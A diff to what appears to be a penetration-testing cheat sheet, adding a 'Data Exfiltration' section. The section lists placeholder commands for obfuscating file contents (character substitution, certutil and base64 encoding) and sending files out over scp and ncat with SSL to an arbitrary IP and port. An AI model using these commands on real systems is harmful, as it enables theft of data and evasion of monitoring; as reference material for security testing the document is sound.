@@ -1007,7 +1007,21 @@ ifconfig -a      # SysV (deprecated)
 ip a             # SystemD
 ```
 
+Data Exfiltration
 
-
-
-
+Session Transcript: ```ssh <user>@<host> | tee```
+Obfuscation (Windows) 
+```
+type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+certutil -encode <file> encoded.b64
+```
+Obfuscation (Linux):
+```
+cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+cat <file>> | base64
+```
+## Encrypted Transport:
+```
+scp <source> <destination>
+ncat --ssl <ip> <port> < <file>
+```
